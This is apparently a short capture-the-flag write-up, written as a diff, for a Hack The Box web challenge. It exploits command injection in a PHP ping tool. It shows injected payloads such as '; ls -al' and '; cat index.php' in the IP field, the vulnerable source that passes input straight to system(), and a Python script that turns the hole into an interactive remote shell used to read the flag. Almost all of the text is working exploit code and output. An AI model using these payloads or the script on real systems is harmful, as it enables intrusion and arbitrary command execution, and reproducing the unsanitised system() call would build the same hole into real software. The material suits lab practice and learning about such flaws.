@@ -1,0 +1,91 @@
+access: 143.110.169.131:32383
+
+some bypass command injection, burpsuite change payload to this:
+test=ping&ip_address=143.110.169.131%3b%20ls%20-al&submit=Test
+143.110.169.131; ls -al
+
+send this: 143.110.169.131; ls -al
+
+result:
+PING 143.110.169.131 (143.110.169.131): 56 data bytes
+--- 143.110.169.131 ping statistics ---
+4 packets transmitted, 0 packets received, 100% packet loss
+total 12
+drwxr-xr-x 2 root root 4096 Nov  2  2020 .
+drwxr-xr-x 1 root root 4096 Jul 13 18:15 ..
+-rw-r--r-- 1 root root 2998 Nov  2  2020 index.php
+
+field three:
+143.110.169.131; cat index.php
+result:
+PING 143.110.169.131 (143.110.169.131): 56 data bytes
+--- 143.110.169.131 ping statistics ---
+4 packets transmitted, 0 packets received, 100% packet loss
+<?php
+function getUserIp()
+{
+    return $_SERVER['REMOTE_ADDR'];
+}
+
+function runTest($test, $ip_address)
+{
+    if ($test === 'ping')
+    {
+        system("ping -c4 ${ip_address}");
+    }
+    if ($test === 'traceroute')
+    {
+        system("traceroute ${ip_address}");
+    }
+}
+?>
+
+let's create our automation exploit:
+from requests import post
+
+cmd = input('>> ')
+
+data = {'test': 'ping', 'ip_address': f'178.62.0.100; {cmd}', 'submit': 'Test'}
+r = post('http://143.110.169.131:32383', data = data)
+
+data = r.text
+data = data.split('packet loss\n')[-1]
+data = data.split('</textarea>')[0]
+
+print(data.strip())
+
+>> ls -al
+total 12
+drwxr-xr-x 2 root root 4096 Nov  2  2020 .
+drwxr-xr-x 1 root root 4096 Jul 13 18:15 ..
+-rw-r--r-- 1 root root 2998 Nov  2  2020 index.php
+
+>> ls -al /
+total 88
+drwxr-xr-x   1 root root 4096 Jul 13 18:15 .
+drwxr-xr-x   1 root root 4096 Jul 13 18:15 ..
+drwxr-xr-x   1 root root 4096 Nov  2  2020 bin
+drwxr-xr-x   2 root root 4096 Sep 19  2020 boot
+drwxr-xr-x   5 root root  360 Jul 13 18:15 dev
+-rw-------   1 root root  127 Nov  2  2020 entrypoint.sh
+drwxr-xr-x   1 root root 4096 Jul 13 18:15 etc
+-rw-r--r--   1 root root   37 Nov  2  2020 flag_QTZUH
+drwxr-xr-x   2 root root 4096 Sep 19  2020 home
+drwxr-xr-x   1 root root 4096 Nov  2  2020 lib
+drwxr-xr-x   2 root root 4096 Oct 12  2020 lib64
+drwxr-xr-x   2 root root 4096 Oct 12  2020 media
+drwxr-xr-x   2 root root 4096 Oct 12  2020 mnt
+drwxr-xr-x   2 root root 4096 Oct 12  2020 opt
+dr-xr-xr-x 287 root root    0 Jul 13 18:15 proc
+drwx------   2 root root 4096 Oct 12  2020 root
+drwxr-xr-x   1 root root 4096 Jul 13 18:15 run
+drwxr-xr-x   1 root root 4096 Nov  2  2020 sbin
+drwxr-xr-x   2 root root 4096 Oct 12  2020 srv
+dr-xr-xr-x  13 root root    0 Jul 13 18:15 sys
+drwxrwxrwt   1 root root 4096 Jul 13 18:15 tmp
+drwxr-xr-x   1 root root 4096 Oct 12  2020 usr
+drwxr-xr-x   1 root root 4096 Nov  2  2020 var
+drwxr-xr-x   2 root root 4096 Nov  2  2020 www
+
+>> cat /flag_QTZUH
+HTB{I_f1n4lly_l00k3d_thr0ugh_th3_rc3}
